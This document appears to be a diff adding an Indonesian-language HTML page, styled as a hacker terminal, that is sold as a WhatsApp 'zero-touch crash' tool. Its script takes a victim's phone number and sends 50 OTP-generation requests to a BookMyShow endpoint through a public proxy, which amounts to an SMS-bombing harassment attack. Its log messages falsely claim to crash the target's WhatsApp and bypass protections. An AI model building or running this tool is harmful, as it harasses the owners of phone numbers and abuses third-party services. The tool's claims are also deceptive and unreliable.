@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Noxa Remote Bug WA</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        .terminal { border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 20px #0f0; max-width: 600px; margin: auto; }
+        input { background: #000; border: 1px solid #0f0; color: #0f0; width: 100%; padding: 10px; margin: 10px 0; }
+        button { background: #0f0; color: #000; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; }
+        #log { margin-top: 20px; font-size: 12px; height: 150px; overflow-y: scroll; border-top: 1px solid #0f0; padding-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <h2>[NOXA REMOTE SYSTEM]</h2>
+        <p>Target: WhatsApp Zero-Touch Crash</p>
+        <input type="text" id="phone" placeholder="Masukkan Nomor (628xxxx)">
+        <button onclick="startAttack()">EKSEKUSI BUG</button>
+        <div id="log">Noxa System Ready...</div>
+    </div>
+
+    <script>
+        async function startAttack() {
+            const phone = document.getElementById('phone').value;
+            const log = document.getElementById('log');
+            if(!phone) return alert("Masukkan nomor target!");
+
+            log.innerHTML += `<br>[*] Menghubungkan ke Surs Core...`;
+            
+            // Loop serangan simulasi API Flooding
+            for(let i = 0; i < 50; i++) {
+                try {
+                    // Menggunakan proxy/api pihak ketiga untuk mengirim request OTP massal
+                    await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://id.bookmyshow.com/api/v1/auth/generate-otp?phone=' + phone)}`);
+                    log.innerHTML += `<br>[+] Payload ${i+1} terkirim ke sistem WA target: ${phone}`;
+                    log.scrollTop = log.scrollHeight;
+                } catch (e) {
+                    log.innerHTML += `<br>[!] Mencoba bypass proteksi...`;
+                }
+            }
+            log.innerHTML += `<br>[SUCCESS] Target ${phone} telah masuk antrian crash.`;
+        }
+    </script>
+</body>
+</html>
